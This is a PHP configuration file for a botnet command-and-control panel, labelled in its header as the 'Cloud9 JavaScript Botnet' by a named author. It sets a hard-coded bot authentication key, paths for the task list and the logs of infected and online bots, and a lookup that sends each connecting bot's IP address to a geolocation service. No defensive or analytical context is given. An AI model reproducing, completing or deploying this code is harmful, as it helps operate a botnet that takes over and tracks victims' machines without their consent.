<?php

// Cloud9 JavaScript Botnet coded by Freak/SynthMesc

date_default_timezone_set("Canada/Pacific"); //Your time zone

$panelRefreshRate = "45"; //Panel refresh rate

$connectKey = "LUCKYfuckinHax0r"; //Key for bot authentication

$tasklist = "./cloud9.tasks"; //Task list location. must start with './'

$logfile = "./logs/cloud9.mainbotlog"; //Main log file location. Must start with './'

$onlinebotlist = "./logs/cloud9.onlinelist"; //Online bot list file location. Again must start './'

$onlinefile = "./logs/cloud9.botsonline"; //Yup. has to start with './' as well

$flagsdir = "/flags"; //Location on the url for the flags directory

$date = date("Y/m/d H:i:s"); //Date format

@$countrycode = strtolower(explode(",", file_get_contents("http://freegeoip.net/csv/" . $_SERVER['REMOTE_ADDR']))[1]);

//^ how we get the country code from ip (must be lowercase)
?>